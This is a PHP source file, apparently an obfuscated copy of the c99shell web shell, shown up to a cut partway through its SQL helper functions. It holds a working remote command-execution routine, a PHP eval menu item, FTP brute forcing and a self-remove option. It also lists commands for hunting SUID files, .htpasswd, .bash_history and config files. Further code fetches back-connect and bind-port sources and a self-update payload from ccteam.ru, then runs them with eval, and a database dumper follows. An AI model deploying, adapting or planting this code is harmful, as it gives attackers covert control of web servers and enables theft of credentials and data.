<?php
echo '[syslog]01
'; if (!function_exists('getmicrotime')) { function getmicrotime() { list($spd3ae5d, $sp2bae6f) = explode(' ', microtime()); return (double) $spd3ae5d + (double) $sp2bae6f; } } error_reporting(5); $sp919bf1 = strtolower(substr(PHP_OS, 0, 3)) == 'win'; define('starttime', getmicrotime()); if (get_magic_quotes_gpc()) { if (!function_exists('strips')) { function strips(&$spc5ba94, $spf38c9d = '') { if (is_array($spc5ba94)) { foreach ($spc5ba94 as $spf38c9d => $spc85aba) { if (strtoupper($spf38c9d) != 'GLOBALS') { strips($spc5ba94["{$spf38c9d}"]); } } } else { $spc5ba94 = stripslashes($spc5ba94); } } } strips($spd3aeac); } $_REQUEST = array_merge($_COOKIE, $_GET, $_POST); foreach ($_REQUEST as $spf38c9d => $spc85aba) { if (!isset(${$spf38c9d})) { ${$spf38c9d} = $spc85aba; } } $sp703f1a = '1.0 pre-release build #16'; if (!empty($spf9d0dd)) { setcookie('c99sh_surl'); $sp4f5f94 = ''; } elseif (!empty($sp63e560)) { $sp4f5f94 = $sp63e560; setcookie('c99sh_surl', $sp4f5f94); } else { $sp4f5f94 = $_REQUEST['c99sh_surl']; } $sped7adb = TRUE; if ($sped7adb and !$_REQUEST['c99sh_surl']) { $spc901d1 = '&'; foreach (explode('&', getenv('QUERY_STRING')) as $spc85aba) { $spc85aba = explode('=', $spc85aba); $sp6ee69e = urldecode($spc85aba[0]); $sp0945f4 = urldecode($spc85aba[1]); foreach (array('http://', 'https://', 'ssl://', 'ftp://', '\\\\') as $spe587e8) { if (strpos($sp0945f4, $spe587e8) === 0) { $sp42d7ab .= urlencode($sp6ee69e) . '=' . urlencode($sp0945f4) . '&'; } } } if ($_REQUEST['surl_autofill_include']) { $sp42d7ab .= 'surl_autofill_include=1&'; } } if (empty($sp4f5f94)) { $sp4f5f94 = '?' . $sp42d7ab; } $sp4f5f94 = htmlspecialchars($sp4f5f94); $sp8e2369 = 0; $spcaff79 = ''; $sp7158a0 = ''; $sp2454f9 = ''; $sp1a1692 = array('*'); $spdefe1c = 'Restricted area'; $spe0b6c1 = '<a href="http://ccteam.ru/releases/c99shell">c99shell v.' . $sp703f1a . '</a>: access denied'; $sp40e72b = TRUE; $spf4e4a7 = FALSE; $spceedb3 = 'http://ccteam.ru/update/c99shell/'; $sp90b8f5 = 'http://ccteam.ru/files/c99sh_sources/'; $spe87a04 = TRUE; $sp35b173 = ''; $spa3dc17 = array(''); $sp79f04a = './'; $spe05b78 = ''; $sp9855f0 = './'; $sp477235 = 'user@host.tld'; $spc0f332 = '0a'; $spce4e00 = TRUE; $sp62c601 = array('html' => array('html', 'htm', 'shtml'), 'txt' => array('txt', 'conf', 'bat', 'sh', 'js', 'bak', 'doc', 'log', 'sfc', 'cfg', 'htaccess'), 'exe' => array('sh', 'install', 'bat', 'cmd'), 'ini' => array('ini', 'inf'), 'code' => array('php', 'phtml', 'php3', 'php4', 'inc', 'tcl', 'h', 'c', 'cpp', 'py', 'cgi', 'pl'), 'img' => array('gif', 'png', 'jpeg', 'jfif', 'jpg', 'jpe', 'bmp', 'ico', 'tif', 'tiff', 'avi', 'mpg', 'mpeg'), 'sdb' => array('sdb'), 'phpsess' => array('sess'), 'download' => array('exe', 'com', 'pif', 'src', 'lnk', 'zip', 'rar', 'gz', 'tar')); $sp4f22dd = array(getenv('PHPRC') . ' -q %f%' => array('php', 'php3', 'php4'), 'perl %f%' => array('pl', 'cgi')); $sp35c514 = array(array(basename($_SERVER['PHP_SELF']), 1, '<font color="yellow">', '</font>'), array('config.php', 1)); $spbcb200 = array('a'); $sp071c94 = 8; $sp4dc0b0 = 24; $sp6f68d2 = 100; $sp2ee0a4 = 'c99'; $spc0ba48 = '31373'; $sp816a08 = '31373'; $spbc7b54 = '8081'; if (!$sp919bf1) { $sp5ed355 = array(array('-----------------------------------------------------------', 'ls -la'), array('find all suid files', 'find / -type f -perm -04000 -ls'), array('find suid files in current dir', 'find . -type f -perm -04000 -ls'), array('find all sgid files', 'find / -type f -perm -02000 -ls'), array('find sgid files in current dir', 'find . -type f -perm -02000 -ls'), array('find config.inc.php files', 'find / -type f -name config.inc.php'), array('find config* files', 'find / -type f -name "config*"'), array('find config* files in current dir', 'find . -type f -name "config*"'), array('find all writable folders and files', 'find / -perm -2 -ls'), array('find all writable folders and files in current dir', 'find . -perm -2 -ls'), array('find all service.pwd files', 'find / -type f -name service.pwd'), array('find service.pwd files in current dir', 'find . -type f -name service.pwd'), array('find all .htpasswd files', 'find / -type f -name .htpasswd'), array('find .htpasswd files in current dir', 'find . -type f -name .htpasswd'), array('find all .bash_history files', 'find / -type f -name .bash_history'), array('find .bash_history files in current dir', 'find . -type f -name .bash_history'), array('find all .fetchmailrc files', 'find / -type f -name .fetchmailrc'), array('find .fetchmailrc files in current dir', 'find . -type f -name .fetchmailrc'), array('list file attributes on a Linux second extended file system', 'lsattr -va'), array('show opened ports', 'netstat -an | grep -i listen')); } else { $sp5ed355 = array(array('-----------------------------------------------------------', 'dir'), array('show opened ports', 'netstat -an')); } $sp859806 = 'c99shvars'; $spb8d715 = TRUE; $spc769f7 = FALSE; $sp86699c = array(array('<img src="' . $sp4f5f94 . 'act=img&img=home" alt="Home" height="20" width="20" border="0">', $sp4f5f94), array('<img src="' . $sp4f5f94 . 'act=img&img=back" alt="Back" height="20" width="20" border="0">', '#" onclick="history.back(1)'), array('<img src="' . $sp4f5f94 . 'act=img&img=forward" alt="Forward" height="20" width="20" border="0">', '#" onclick="history.go(1)'), array('<img src="' . $sp4f5f94 . 'act=img&img=up" alt="UPDIR" height="20" width="20" border="0">', $sp4f5f94 . 'act=ls&d=%upd&sort=%sort'), array('<img src="' . $sp4f5f94 . 'act=img&img=refresh" alt="Refresh" height="20" width="17" border="0">', ''), array('<img src="' . $sp4f5f94 . 'act=img&img=search" alt="Search" height="20" width="20" border="0">', $sp4f5f94 . 'act=search&d=%d'), array('<img src="' . $sp4f5f94 . 'act=img&img=buffer" alt="Buffer" height="20" width="20" border="0">', $sp4f5f94 . 'act=fsbuff&d=%d'), array('<b>Encoder</b>', $sp4f5f94 . 'act=encoder&d=%d'), array('<b>Tools</b>', $sp4f5f94 . 'act=tools&d=%d'), array('<b>Proc.</b>', $sp4f5f94 . 'act=processes&d=%d'), array('<b>FTP brute</b>', $sp4f5f94 . 'act=ftpquickbrute&d=%d'), array('<b>Sec.</b>', $sp4f5f94 . 'act=security&d=%d'), array('<b>SQL</b>', $sp4f5f94 . 'act=sql&d=%d'), array('<b>PHP-code</b>', $sp4f5f94 . 'act=eval&d=%d'), array('<b>Update</b>', $sp4f5f94 . 'act=update&d=%d'), array('<b>Feedback</b>', $sp4f5f94 . 'act=feedback&d=%d'), array('<b>Self remove</b>', $sp4f5f94 . 'act=selfremove'), array('<b>Logout</b>', '#" onclick="if (confirm(\'Are you sure?\')) window.close()')); $spbd427f = '#c0c0c0'; $spe4b9a4 = '#FFFFFF'; $spa931ae = '#6A6A6A'; $sp62f8af = '#0000BB'; $sp18ff99 = '#1300FF'; $spd70a6d = '#007700'; $sp66d7d2 = '#000000'; @($sp77bd8d = $_REQUEST['f']); @extract($_REQUEST['c99shcook']); $sp13d1b2 = array(); foreach ($sp1a1692 as $spf38c9d => $spc85aba) { $sp13d1b2[] = str_replace('\\*', '.*', preg_quote($spc85aba)); } $spe8dfbe = '!^(' . implode('|', $sp13d1b2) . ')$!i'; if (!preg_match($spe8dfbe, getenv('REMOTE_ADDR')) and !preg_match($spe8dfbe, gethostbyaddr(getenv('REMOTE_ADDR')))) { die('<a href="http://ccteam.ru/releases/cc99shell">c99shell</a>: Access Denied - your host (' . getenv('REMOTE_ADDR') . ') not allow'); } if (!empty($spcaff79)) { if (empty($sp2454f9)) { $sp2454f9 = md5($sp7158a0); } if ($_SERVER['PHP_AUTH_USER'] != $spcaff79 or md5($_SERVER['PHP_AUTH_PW']) != $sp2454f9) { if (empty($spdefe1c)) { $spdefe1c = strip_tags(ereg_replace('&nbsp;|<br>', ' ', $sp35b173)); } header('WWW-Authenticate: Basic realm="c99shell ' . $sp703f1a . ': ' . $spdefe1c . '"'); header('HTTP/1.0 401 Unauthorized'); die($spe0b6c1); } } if ($spabab30 != 'img') { $sp62c3ea = realpath('.'); chdir($sp79f04a); if ($sp0d9ac4 or $spf4e4a7) { @ob_clean(); c99sh_getupdate($sp0d9ac4, 1); die; } $sp597c2f = unserialize($_COOKIE["{$sp859806}"]); if (!is_array($sp597c2f)) { $sp597c2f = array(); } if (!is_array($sp597c2f['copy'])) { $sp597c2f['copy'] = array(); } if (!is_array($sp597c2f['cut'])) { $sp597c2f['cut'] = array(); } $spc2fe50 = @ini_get('disable_functions'); if (!empty($spc2fe50)) { $spc2fe50 = str_replace(' ', '', $spc2fe50); $spc2fe50 = explode(',', $spc2fe50); } echo '[syslog]02
'; if (!function_exists('c99_buff_prepare')) { function c99_buff_prepare() { global $sp597c2f; global $spabab30; foreach ($sp597c2f['copy'] as $spf38c9d => $spc85aba) { $sp597c2f['copy'][$spf38c9d] = str_replace('\\', DIRECTORY_SEPARATOR, realpath($spc85aba)); } foreach ($sp597c2f['cut'] as $spf38c9d => $spc85aba) { $sp597c2f['cut'][$spf38c9d] = str_replace('\\', DIRECTORY_SEPARATOR, realpath($spc85aba)); } $sp597c2f['copy'] = array_unique($sp597c2f['copy']); $sp597c2f['cut'] = array_unique($sp597c2f['cut']); sort($sp597c2f['copy']); sort($sp597c2f['cut']); if ($spabab30 != 'copy') { foreach ($sp597c2f['cut'] as $spf38c9d => $spc85aba) { if ($sp597c2f['copy'][$spf38c9d] == $spc85aba) { unset($sp597c2f['copy'][$spf38c9d]); } } } else { foreach ($sp597c2f['copy'] as $spf38c9d => $spc85aba) { if ($sp597c2f['cut'][$spf38c9d] == $spc85aba) { unset($sp597c2f['cut'][$spf38c9d]); } } } } } c99_buff_prepare(); if (!function_exists('c99_sess_put')) { function c99_sess_put($sp8dce42) { global $sp859806; global $sp597c2f; c99_buff_prepare(); $sp597c2f = $sp8dce42; $sp8dce42 = serialize($sp8dce42); setcookie($sp859806, $sp8dce42); } } foreach (array('sort', 'sql_sort') as $spc85aba) { if (!empty($_GET[$spc85aba])) { ${$spc85aba} = $_GET[$spc85aba]; } if (!empty($_POST[$spc85aba])) { ${$spc85aba} = $_POST[$spc85aba]; } } if ($spce4e00) { if (!empty($spe057bf)) { setcookie('sort', $spe057bf); } if (!empty($spa09dde)) { setcookie('sql_sort', $spa09dde); } } if (!function_exists('str2mini')) { function str2mini($sp15c035, $spc78007) { if (strlen($sp15c035) > $spc78007) { $spc78007 = ceil($spc78007 / 2) - 2; return substr($sp15c035, 0, $spc78007) . '...' . substr($sp15c035, -$spc78007); } else { return $sp15c035; } } } if (!function_exists('view_size')) { function view_size($sp1763a0) { if (!is_numeric($sp1763a0)) { return FALSE; } else { if ($sp1763a0 >= 1073741824) { $sp1763a0 = round($sp1763a0 / 1073741824 * 100) / 100 . ' GB'; } elseif ($sp1763a0 >= 1048576) { $sp1763a0 = round($sp1763a0 / 1048576 * 100) / 100 . ' MB'; } elseif ($sp1763a0 >= 1024) { $sp1763a0 = round($sp1763a0 / 1024 * 100) / 100 . ' KB'; } else { $sp1763a0 = $sp1763a0 . ' B'; } return $sp1763a0; } } } if (!function_exists('fs_copy_dir')) { function fs_copy_dir($sp549585, $sp43d1d8) { $sp549585 = str_replace('\\', DIRECTORY_SEPARATOR, $sp549585); if (substr($sp549585, -1) != DIRECTORY_SEPARATOR) { $sp549585 .= DIRECTORY_SEPARATOR; } $sp17341d = opendir($sp549585); while (($sp5b8817 = readdir($sp17341d)) !== FALSE) { if ($sp5b8817 != '.' and $sp5b8817 != '..') { if (!is_dir($sp549585 . DIRECTORY_SEPARATOR . $sp5b8817)) { $sp6ec051 = copy($sp549585 . DIRECTORY_SEPARATOR . $sp5b8817, $sp43d1d8 . DIRECTORY_SEPARATOR . $sp5b8817); } else { $sp6ec051 = mkdir($sp43d1d8 . DIRECTORY_SEPARATOR . $sp5b8817); fs_copy_dir($sp549585 . DIRECTORY_SEPARATOR . $sp5b8817, $sp43d1d8 . DIRECTORY_SEPARATOR . $sp5b8817); } if (!$sp6ec051) { return $sp6ec051; } } } closedir($sp17341d); return TRUE; } } if (!function_exists('fs_copy_obj')) { function fs_copy_obj($sp549585, $sp43d1d8) { $sp549585 = str_replace('\\', DIRECTORY_SEPARATOR, $sp549585); $sp43d1d8 = str_replace('\\', DIRECTORY_SEPARATOR, $sp43d1d8); if (!is_dir(dirname($sp43d1d8))) { mkdir(dirname($sp43d1d8)); } if (is_dir($sp549585)) { if (substr($sp549585, -1) != DIRECTORY_SEPARATOR) { $sp549585 .= DIRECTORY_SEPARATOR; } if (substr($sp43d1d8, -1) != DIRECTORY_SEPARATOR) { $sp43d1d8 .= DIRECTORY_SEPARATOR; } return fs_copy_dir($sp549585, $sp43d1d8); } elseif (is_file($sp549585)) { return copy($sp549585, $sp43d1d8); } else { return FALSE; } } } if (!function_exists('fs_move_dir')) { function fs_move_dir($sp549585, $sp43d1d8) { $sp17341d = opendir($sp549585); if (!is_dir($sp43d1d8)) { mkdir($sp43d1d8); } while (($sp5b8817 = readdir($sp17341d)) !== FALSE) { if ($sp5b8817 != '.' and $sp5b8817 != '..') { $sp6ec051 = TRUE; if (!is_dir($sp549585 . DIRECTORY_SEPARATOR . $sp5b8817)) { $sp6ec051 = copy($sp549585 . DIRECTORY_SEPARATOR . $sp5b8817, $sp43d1d8 . DIRECTORY_SEPARATOR . $sp5b8817); } else { if (mkdir($sp43d1d8 . DIRECTORY_SEPARATOR . $sp5b8817) and fs_copy_dir($sp549585 . DIRECTORY_SEPARATOR . $sp5b8817, $sp43d1d8 . DIRECTORY_SEPARATOR . $sp5b8817)) { $sp6ec051 = FALSE; } } if (!$sp6ec051) { return $sp6ec051; } } } closedir($sp17341d); return TRUE; } } if (!function_exists('fs_move_obj')) { function fs_move_obj($sp549585, $sp43d1d8) { $sp549585 = str_replace('\\', DIRECTORY_SEPARATOR, $sp549585); $sp43d1d8 = str_replace('\\', DIRECTORY_SEPARATOR, $sp43d1d8); if (is_dir($sp549585)) { if (substr($sp549585, -1) != DIRECTORY_SEPARATOR) { $sp549585 .= DIRECTORY_SEPARATOR; } if (substr($sp43d1d8, -1) != DIRECTORY_SEPARATOR) { $sp43d1d8 .= DIRECTORY_SEPARATOR; } return fs_move_dir($sp549585, $sp43d1d8); } elseif (is_file($sp549585)) { if (copy($sp549585, $sp43d1d8)) { return unlink($sp549585); } else { unlink($sp43d1d8); return FALSE; } } else { return FALSE; } } } if (!function_exists('fs_rmdir')) { function fs_rmdir($sp549585) { $sp17341d = opendir($sp549585); while (($sp5b8817 = readdir($sp17341d)) !== FALSE) { if ($sp5b8817 != '.' and $sp5b8817 != '..') { if (!is_dir($sp549585 . $sp5b8817)) { unlink($sp549585 . $sp5b8817); } else { fs_rmdir($sp549585 . $sp5b8817 . DIRECTORY_SEPARATOR); rmdir($sp549585 . $sp5b8817); } } } closedir($sp17341d); rmdir($sp549585); return !is_dir($sp549585); } } if (!function_exists('fs_rmobj')) { function fs_rmobj($sp5b8817) { $sp5b8817 = str_replace('\\', DIRECTORY_SEPARATOR, $sp5b8817); if (is_dir($sp5b8817)) { if (substr($sp5b8817, -1) != DIRECTORY_SEPARATOR) { $sp5b8817 .= DIRECTORY_SEPARATOR; } return fs_rmdir($sp5b8817); } elseif (is_file($sp5b8817)) { return unlink($sp5b8817); } else { return FALSE; } } } if (!function_exists('myshellexec')) { function myshellexec($spa71965) { global $spc2fe50; $sp3b8eaf = ''; if (!empty($spa71965)) { if (is_callable('exec') and !in_array('exec', $spc2fe50)) { exec($spa71965, $sp3b8eaf); $sp3b8eaf = join('
', $sp3b8eaf); } elseif (($sp3b8eaf = `{$spa71965}`) !== FALSE) { } elseif (is_callable('system') and !in_array('system', $spc2fe50)) { $spc85aba = @ob_get_contents(); @ob_clean(); system($spa71965); $sp3b8eaf = @ob_get_contents(); @ob_clean(); echo $spc85aba; } elseif (is_callable('passthru') and !in_array('passthru', $spc2fe50)) { $spc85aba = @ob_get_contents(); @ob_clean(); passthru($spa71965); $sp3b8eaf = @ob_get_contents(); @ob_clean(); echo $spc85aba; } elseif (is_resource($spe2e680 = popen($spa71965, 'r'))) { $sp3b8eaf = ''; while (!feof($spe2e680)) { $sp3b8eaf .= fread($spe2e680, 1024); } pclose($spe2e680); } } return $sp3b8eaf; } } if (!function_exists('tabsort')) { function tabsort($sp62a453, $sp47eda8) { global $spc85aba; return strnatcmp($sp62a453[$spc85aba], $sp47eda8[$spc85aba]); } } if (!function_exists('view_perms')) { function view_perms($sp03a871) { if (($sp03a871 & 49152) === 49152) { $spf661d7 = 's'; } elseif (($sp03a871 & 16384) === 16384) { $spf661d7 = 'd'; } elseif (($sp03a871 & 40960) === 40960) { $spf661d7 = 'l'; } elseif (($sp03a871 & 32768) === 32768) { $spf661d7 = '-'; } elseif (($sp03a871 & 24576) === 24576) { $spf661d7 = 'b'; } elseif (($sp03a871 & 8192) === 8192) { $spf661d7 = 'c'; } elseif (($sp03a871 & 4096) === 4096) { $spf661d7 = 'p'; } else { $spf661d7 = '?'; } $spdde061['read'] = $sp03a871 & 256 ? 'r' : '-'; $spdde061['write'] = $sp03a871 & 128 ? 'w' : '-'; $spdde061['execute'] = $sp03a871 & 64 ? 'x' : '-'; $sp99af08['read'] = $sp03a871 & 32 ? 'r' : '-'; $sp99af08['write'] = $sp03a871 & 16 ? 'w' : '-'; $sp99af08['execute'] = $sp03a871 & 8 ? 'x' : '-'; $sp9792be['read'] = $sp03a871 & 4 ? 'r' : '-'; $sp9792be['write'] = $sp03a871 & 2 ? 'w' : '-'; $sp9792be['execute'] = $sp03a871 & 1 ? 'x' : '-'; if ($sp03a871 & 2048) { $spdde061['execute'] = $spdde061['execute'] == 'x' ? 's' : 'S'; } if ($sp03a871 & 1024) { $sp99af08['execute'] = $sp99af08['execute'] == 'x' ? 's' : 'S'; } if ($sp03a871 & 512) { $sp9792be['execute'] = $sp9792be['execute'] == 'x' ? 't' : 'T'; } return $spf661d7 . join('', $spdde061) . join('', $sp99af08) . join('', $sp9792be); } } if (!function_exists('posix_getpwuid') and !in_array('posix_getpwuid', $spc2fe50)) { function posix_getpwuid($sp805cc3) { return FALSE; } } if (!function_exists('posix_getgrgid') and !in_array('posix_getgrgid', $spc2fe50)) { function posix_getgrgid($sp9ee83b) { return FALSE; } } if (!function_exists('posix_kill') and !in_array('posix_kill', $spc2fe50)) { function posix_kill($sp9ee83b) { return FALSE; } } if (!function_exists('parse_perms')) { function parse_perms($sp03a871) { if (($sp03a871 & 49152) === 49152) { $sp43d1d8 = 's'; } elseif (($sp03a871 & 16384) === 16384) { $sp43d1d8 = 'd'; } elseif (($sp03a871 & 40960) === 40960) { $sp43d1d8 = 'l'; } elseif (($sp03a871 & 32768) === 32768) { $sp43d1d8 = '-'; } elseif (($sp03a871 & 24576) === 24576) { $sp43d1d8 = 'b'; } elseif (($sp03a871 & 8192) === 8192) { $sp43d1d8 = 'c'; } elseif (($sp03a871 & 4096) === 4096) { $sp43d1d8 = 'p'; } else { $sp43d1d8 = '?'; } $sp5b8817['r'] = ($sp03a871 & 256) > 0; $sp5b8817['w'] = ($sp03a871 & 128) > 0; $sp5b8817['x'] = ($sp03a871 & 64) > 0; $sp5ac67a['r'] = ($sp03a871 & 32) > 0; $sp5ac67a['w'] = ($sp03a871 & 16) > 0; $sp5ac67a['x'] = ($sp03a871 & 8) > 0; $spfff108['r'] = ($sp03a871 & 4) > 0; $spfff108['w'] = ($sp03a871 & 2) > 0; $spfff108['x'] = ($sp03a871 & 1) > 0; return array('t' => $sp43d1d8, 'o' => $sp5b8817, 'g' => $sp5ac67a, 'w' => $spfff108); } } if (!function_exists('parsesort')) { function parsesort($spe057bf) { $spc326bd = intval($spe057bf); $sp6819a9 = substr($spe057bf, -1); if ($sp6819a9 != 'd') { $sp6819a9 = 'a'; } return array($spc326bd, $sp6819a9); } } if (!function_exists('view_perms_color')) { function view_perms_color($sp5b8817) { if (!is_readable($sp5b8817)) { return '<font color=red>' . view_perms(fileperms($sp5b8817)) . '</font>'; } elseif (!is_writable($sp5b8817)) { return '<font color=white>' . view_perms(fileperms($sp5b8817)) . '</font>'; } else { return '<font color=green>' . view_perms(fileperms($sp5b8817)) . '</font>'; } } } if (!function_exists('c99getsource')) { function c99getsource($sp1fe1b6) { global $sp90b8f5; $spdace5e = array('c99sh_bindport.pl' => 'c99sh_bindport_pl.txt', 'c99sh_bindport.c' => 'c99sh_bindport_c.txt', 'c99sh_backconn.pl' => 'c99sh_backconn_pl.txt', 'c99sh_backconn.c' => 'c99sh_backconn_c.txt', 'c99sh_datapipe.pl' => 'c99sh_datapipe_pl.txt', 'c99sh_datapipe.c' => 'c99sh_datapipe_c.txt'); $sp6ee69e = $spdace5e[$sp1fe1b6]; if ($sp6ee69e) { return file_get_contents($sp90b8f5 . $sp6ee69e); } else { return FALSE; } } } if (!function_exists('c99sh_getupdate')) { function c99sh_getupdate($sp03891f = TRUE) { $spdfdc3d = $spd3aeac['c99sh_updateurl'] . '?version=' . urlencode(base64_encode($spd3aeac['shver'])) . '&updatenow=' . ($spf4e4a7 ? '1' : '0') . '&'; $sp8dce42 = @file_get_contents($spdfdc3d); if (!$sp8dce42) { return 'Can\'t connect to update-server!'; } else { $sp8dce42 = ltrim($sp8dce42); $sp1e1aba = substr($sp8dce42, 3, ord($sp8dce42[2])); if ($sp8dce42[0] == '™' and $sp8dce42[1] == '') { return 'Error: ' . $sp1e1aba; return FALSE; } if ($sp8dce42[0] == '™' and $sp8dce42[1] == '') { return 'You are using latest version!'; } if ($sp8dce42[0] == '™' and $sp8dce42[1] == '') { $sp1e1aba = explode('', $sp1e1aba); if ($sp03891f) { $spf0e748 = array(); $sp17da4d = $sp1e1aba[0]; $sp4feb9a = file_get_contents($sp17da4d); if (!$sp4feb9a) { return 'Can\'t fetch update!'; } else { $spe2e680 = fopen(__FILE__, 'w'); if (!$spe2e680) { return 'Local error: can\'t write update to ' . __FILE__ . '! You may download c99shell.php manually <a href="' . $sp17da4d . '"><u>here</u></a>.'; } else { fwrite($spe2e680, $sp4feb9a); fclose($spe2e680); return 'Thanks! Updated with success.'; } } } else { return 'New version are available: ' . $sp1e1aba[1]; } } elseif ($sp8dce42[0] == '™' and $sp8dce42[1] == '') { eval($sp1e1aba); return 1; } else { return 'Error in protocol: segmentation failed! (' . $sp8dce42 . ') '; } } } } if (!function_exists('mysql_dump')) { function mysql_dump($sp4a009d) { global $sp703f1a; $spb7af44 = $sp4a009d['sock']; $sp790812 = $sp4a009d['db']; $sp334fd8 = $sp4a009d['print']; $sp5a3248 = $sp4a009d['nl2br']; $sp8f7201 = $sp4a009d['file']; $sp62a3e4 = $sp4a009d['add_drop']; $spf15b9b = $sp4a009d['tabs']; $sp7684fb = $sp4a009d['onlytabs']; $sp6ec051 = array(); $sp6ec051['err'] = array(); if (!is_resource($spb7af44)) { echo 'Error: $sock is not valid resource.'; } if (empty($sp790812)) { $sp790812 = 'db'; } if (empty($sp334fd8)) { $sp334fd8 = 0; } if (empty($sp5a3248)) { $sp5a3248 = 0; } if (empty($sp62a3e4)) { $sp62a3e4 = TRUE; } if (empty($sp8f7201)) { $sp8f7201 = $spe05b78 . 'dump_' . getenv('SERVER_NAME') . '_' . $sp790812 . '_' . date('d-m-Y-H-i-s') . '.sql'; } if (!is_array($spf15b9b)) { $spf15b9b = array(); } if (empty($sp62a3e4)) { $sp62a3e4 = TRUE; } if (sizeof($spf15b9b) == 0) { $sp0f850d = mysql_query('SHOW TABLES FROM ' . $sp790812, $spb7af44); if (mysql_num_rows($sp0f850d) > 0) { while ($spfe8f01 = mysql_fetch_row($sp0f850d)) { $spf15b9b[] = $spfe8f01[0]; } } } $sp409789 = '# Dumped by C99Shell.SQL v. ' . $sp703f1a . '
# Home page: http://ccteam.ru
#
# Host settings:
# MySQL version: (' . mysql_get_server_info() . ') running on ' . getenv('SERVER_ADDR') . ' (' . getenv('SERVER_NAME') . ')' . '
# Date: ' . date('d.m.Y H:i:s') . '
# DB: "' . $sp790812 . '"
#---------------------------------------------------------
'; $spa89771 = count($sp7684fb); foreach ($spf15b9b as $sp208cb5) { if (in_array($sp208cb5, $sp7684fb) or !$spa89771) { if ($sp62a3e4) { $sp409789 .= 'DROP TABLE IF EXISTS `' . $sp208cb5 . '`;
'; } $sp0f850d = mysql_query('SHOW CREATE TABLE `' . $sp208cb5 . '`', $spb7af44); if (!$sp0f850d) { $sp6ec051['err'][] = mysql_smarterror(); } else { $spfe8f01 = mysql_fetch_row($sp0f850d); $sp409789 .= $spfe8f01['1'] . ';

'; $sp0f850d = mysql_query("SELECT * FROM `{$sp208cb5}`", $spb7af44); if (mysql_num_rows($sp0f850d) > 0) { while ($spfe8f01 = mysql_fetch_assoc($sp0f850d)) { $spd31430 = implode('`, `', array_keys($spfe8f01)); $sp843422 = array_values($spfe8f01); foreach ($sp843422 as $spf38c9d => $spc85aba) { $sp843422[$spf38c9d] = addslashes($spc85aba); } $sp843422 = implode('\', \'', $sp843422); $sp51ceff = "INSERT INTO `{$sp208cb5}`(`" . $spd31430 . '`) VALUES (\'' . $sp843422 . '\');
'; $sp409789 .= $sp51ceff; } } } } } $sp409789 .= '#---------------------------------------------------------------------------------

'; if ($sp8f7201) { $spe2e680 = fopen($sp8f7201, 'w'); if (!$spe2e680) { $sp6ec051['err'][] = 2; } else { fwrite($spe2e680, $sp409789); fclose($spe2e680); } } if ($sp334fd8) { if ($sp5a3248) { echo nl2br($sp409789); } else { echo $sp409789; } } return $sp409789; } } if (!function_exists('mysql_buildwhere')) { function mysql_buildwhere($spdace5e, $spe455e8 = ' and', $sp25d04b = array()) { if (!is_array($spdace5e)) { $spdace5e = array(); } $sp3b8eaf = ''; foreach ($spdace5e as $spf38c9d => $spc85aba) { $sp0945f4 = ''; if (!empty($sp25d04b[$spf38c9d])) { $sp0945f4 .= $sp25d04b[$spf38c9d] . '('; } $sp0945f4 .= '\'' . addslashes($spc85aba) . '\''; if (!empty($sp25d04b[$spf38c9d])) { $sp0945f4 .= ')'; } $sp3b8eaf .= '`' . $spf38c9d . '` = ' . $sp0945f4 . $spe455e8; } $sp3b8eaf = substr($sp3b8eaf, 0, strlen($sp3b8eaf) - strlen($spe455e8)); return $sp3b8eaf; } } if (!function_exists('mysql_fetch_all')) { function mysql_fetch_all($sp0beb9d, $spb7af44) { if ($spb7af44) { $sp3b8eaf = mysql_query($sp0beb9d, $spb7af44); } else { $sp3b8eaf = mysql_query($sp0beb9d); } $spdace5e = array(); while ($spfe8f01 = mysql_fetch_array($sp3b8eaf)) { $spdace5e[] = $spfe8f01; } mysql_free_result($sp3b8eaf); return $spdace5e; } } if (!function_exists('mysql_smarterror')) { function mysql_smarterror($spf661d7, $spb7af44) { if ($spb7af44) { $sp6d8019 = mysql_error($spb7af44); } else { $sp6d8019 = mysql_error(); } $sp6d8019 = htmlspecialchars($sp6d8019); return $sp6d8019; } } if (!function_exists('mysql_query_form')) { function mysql_query_form() { global $sp58b8eb, $spea4e41, $sp3d25fd, $sp51f26c, $spf4bc54, $sp4b9380, $spe64d1d; if ($sp58b8eb and !$sp51f26c and $spf4bc54) { if (!$sp4b9380) { $sp4b9380 = 'Query was empty'; } echo '<b>Error:</b> <br>' . $sp4b9380 . '<br>'; } if ($sp51f26c or !$spf4bc54) { $spea4e41 = $spe2a3c1; } if (!$sp58b8eb or $spea4e41) { echo '<table border=0><tr><td><form name="c99sh_sqlquery" method=POST><b>'; if ($sp3d25fd and !$sp58b8eb) { echo 'Do you really want to'; } else { echo 'SQL-Query'; } echo ':</b><br><br><textarea name=sql_query cols=100 rows=10>' . htmlspecialchars($sp3d25fd) . '</textarea><br><br><input type=hidden name=act value=sql><input type=hidden name=sql_act value=query><input type=hidden name=sql_tbl value="' . htmlspecialchars($sp0f586b) . '"><input type=hidden name=submit value="1"><input type=hidden name="sql_goto" value="' . htmlspecialchars($spe2a3c1) . '"><input type=submit name=sql_confirm value="Yes">&nbsp;<input type=submit value="No"></form></td>'; if ($spe64d1d) { echo '<td valign="top"><b>Fields:</b><br>'; foreach ($spe64d1d as $spfb39ee) { $sp6ee69e = $spfb39ee['Field']; echo 'Â» <a href="#" onclick="document.c99sh_sqlquery.sql_query.value+=\'`' . $sp6ee69e . '`\';"><b>' . $sp6ee69e . '</b></a><br>'; } echo '</td></tr></table>'; } } if ($sp51f26c or !$spf4bc54) { $sp3d25fd = $spb3b421; } } } if (!function_exists('mysql_create_db')) { function mysql_create_db($sp790812, $spb7af44 = '') { $sp51ceff = 'CREATE DATABASE `' . addslashes($sp790812) . '`;'; if ($spb7af44) { return mysql_query($sp51ceff, $spb7af44); } else { return mysql_query($sp51ceff); } } } if (!function_exists('mysql_query_parse')) { function mysql_query_parse($sp0beb9d) { $sp0beb9d = trim($sp0beb9d); $spc5ba94 = explode(' ', $sp0beb9d); $sp3c5a6b = array('SELECT' => array(3, 1), 'SHOW' => array(2, 1), 'DELETE' => array(1), 'DROP' => array(1)); $sp3b8eaf = array(); $sp867cd2 = strtoupper($spc5ba94[0]); if (is_array($sp3c5a6b[$sp867cd2])) { $sp3b8eaf['propertions'] = $sp3c5a6b[$sp867cd2]; $sp3b8eaf['query'] = $sp0beb9d; if ($sp3c5a6b[$sp867cd2] == 2) { foreach ($spc5ba94 as $spf38c9d => $spc85aba) { if (strtoupper($spc85aba) == 'LIMIT') { $sp3b8eaf['limit'] = $spc5ba94[$spf38c9d + 1]; $sp3b8eaf['limit'] = explode(',', $sp3b8eaf['limit']); if (count($sp3b8eaf['limit']) == 1) { 